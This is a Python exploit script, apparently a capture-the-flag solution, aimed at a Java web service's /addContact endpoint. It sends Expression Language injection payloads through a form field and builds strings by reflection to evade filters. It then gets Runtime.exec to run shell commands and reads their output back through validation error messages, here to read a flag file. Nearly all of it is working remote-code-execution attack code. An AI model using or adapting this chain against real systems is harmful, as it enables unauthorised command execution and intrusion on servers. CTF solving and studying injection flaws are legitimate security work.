import json
import re
import string
import time
from collections import OrderedDict

import requests

# Local tests
TARGET = "http://victim:1337"

SPLIT_CHAR = ","
LETTERS = string.ascii_letters
JAVA = "java"
CHARZAO = "Char"
CHARZINHO = "char"
DOT = "."
WORDLIST = [JAVA, CHARZAO, CHARZINHO, DOT]
STRING_CLASS = "message.getClass()"
CLASS_CLASS = STRING_CLASS + ".getClass()"
FORNAME_METHOD_INDEX = 2
SUBSTRING_METHOD_INDEX = 44
ASC_TO_STRING_METHOD_INDEX = 5
RUNTIME_EXEC_INDEX = 12
RUNTIME_GETRUNTIME_INDEX = 6
INPUTSTREAMREADER_CONSTRUCTOR_INDEX = 3
BUFFERED_READER_CONSTRUCTOR_INDEX = 1
STARTING_SUBSTRING_TABLE = {}
SUBSTRING_TABLE = OrderedDict()

session = requests.Session()


def postPayload(payload, retries=5, delay=2):
    json_data = {
        "firstName": "Nep",
        "lastName": "Tunian",
        "description": "Abc",
        "country": payload,
    }
    for attempt in range(retries):
        try:
            response = session.post(f"{TARGET}/addContact", json=json_data)
            return json.loads(response.text)
        except requests.exceptions.ConnectionError as e:
            if attempt < retries - 1:
                time.sleep(delay)
                continue
            else:
                raise


def generate_num(num):
    null_list = ",".join(["null"] * num)
    result = f"[{null_list}].size()"
    return result


def gen_el(content):
    return "${" + content + "}"


def get_method_index_from_class(class_str, index):
    return f"{class_str}.getMethods()[{generate_num(index)}]"


def get_declared_field(class_str, index):
    index_num = generate_num(index)
    return f"{class_str}.getDeclaredFields()[{index_num}]"


def enrich_substring_table(source, source_index, str):
    for word in WORDLIST:
        if word in STARTING_SUBSTRING_TABLE:
            continue

        index = str.find(word)
        if index >= 0:
            STARTING_SUBSTRING_TABLE[word] = [source, source_index, index, index + len(word)]


def get_message_from_json(json_result):
    return json_result["violations"][0]["message"].replace(" is not a valid country", "")


def gen_substring_table():

    ### String
    # String fields
    for i in range(10):
        payload = f"{gen_el(get_declared_field(STRING_CLASS, i))}"
        result = get_message_from_json(postPayload(payload))
        enrich_substring_table("string_fields", i, result)

    # String methods
    for i in range(80):
        payload = f"{gen_el(get_method_index_from_class(STRING_CLASS, i))}"
        result = get_message_from_json(postPayload(payload))
        enrich_substring_table("string_methods", i, result)


def gen_substring(object, index_start, index_end):
    return f"{object}.toString().substring({generate_num(index_start)}, {generate_num(index_end)})"


def gen_word(word):
    if word not in WORDLIST:
        return "null"

    source, source_index, index_start, index_end = SUBSTRING_TABLE[word]

    if source == "string_fields":
        object = get_declared_field(STRING_CLASS, source_index)
    else:
        object = get_method_index_from_class(STRING_CLASS, source_index)

    return gen_substring(object, index_start, index_end)


def gen_concat_str(left, middle, right):

    current_str = ""
    if left != "":
        current_str = left

    if current_str != "":
        current_str += f".concat({middle})"
    else:
        current_str = middle

    if right != "":
        current_str += f".concat({right})"

    return current_str


def gen_string(str, word_index=0):

    if word_index >= len(WORDLIST):
        current_str = ""

        for ch in str:
            ch_str = gen_asc_to_string(ord(ch))
            if current_str != "":
                current_str = f"{current_str}.concat({ch_str})"
            else:
                current_str += ch_str

        return current_str

    if len(str) == 0:
        return ""

    # find words
    word = WORDLIST[word_index]

    if str == word:
        return gen_word(word)

    index = str.find(word)
    if index >= 0:

        if index > 0:
            left = gen_string(str[:index])
        else:
            # avoid -1 getting more data
            left = ""

        right = gen_string(str[index + len(word) :])
        processed_word = gen_word(word)
        return gen_concat_str(left, processed_word, right)
    else:
        return gen_string(str, word_index + 1)


def gen_class_forname(class_name):
    forname = get_method_index_from_class(CLASS_CLASS, FORNAME_METHOD_INDEX)
    class_str = gen_string(class_name)
    return f"{forname}.invoke(null, {class_str})"


def gen_asc_to_string(asc):
    character_class = gen_class_forname("java.lang.Character")
    to_string_method = get_method_index_from_class(character_class, ASC_TO_STRING_METHOD_INDEX)
    asc_number = generate_num(asc)

    return f"{to_string_method}.invoke(null, {asc_number})"


def gen_invoke_method(method, params):
    current = f"{method}.invoke(null"
    for param in params:
        param_str = ", " + gen_string(param)
        current += param_str

    current += ")"
    return current


def initialize():

    for l in LETTERS:
        WORDLIST.append(l)

    gen_substring_table()

    for word in WORDLIST:
        if word in STARTING_SUBSTRING_TABLE:
            SUBSTRING_TABLE[word] = STARTING_SUBSTRING_TABLE[word]


def attack(command):
    initialize()
    forname_runtime = gen_class_forname("java.lang.Runtime")
    forname_inputstreamreader = gen_class_forname("java.io.InputStreamReader")
    forname_bufferedreader = gen_class_forname("java.io.BufferedReader")
    method = get_method_index_from_class(forname_runtime, RUNTIME_GETRUNTIME_INDEX)
    get_runtime = gen_invoke_method(method, [])
    bash_payload = gen_string(command)
    exec_payload = get_runtime + ".exec(" + bash_payload + ").getInputStream()"

    input_stream_reader = f"{forname_inputstreamreader}.getDeclaredConstructors()[{generate_num(INPUTSTREAMREADER_CONSTRUCTOR_INDEX)}]"
    input_stream_payload = f"{input_stream_reader}.newInstance({exec_payload})"

    buffered_reader = f"{forname_bufferedreader}.getDeclaredConstructors()[{generate_num(BUFFERED_READER_CONSTRUCTOR_INDEX)}]"
    inner_payload = f"{buffered_reader}.newInstance({input_stream_payload}).readLine()"
    payload = gen_el(inner_payload)
    raw_string = str(postPayload(payload))

    match = re.search(r"'message': '(.+?) is not a valid country'", raw_string)
    if match:
        return match.group(1)
    else:
        raise Exception


print(attack(f"cat /flag-445efbbe792a8837fabdc97ee1b369fd.txt"))
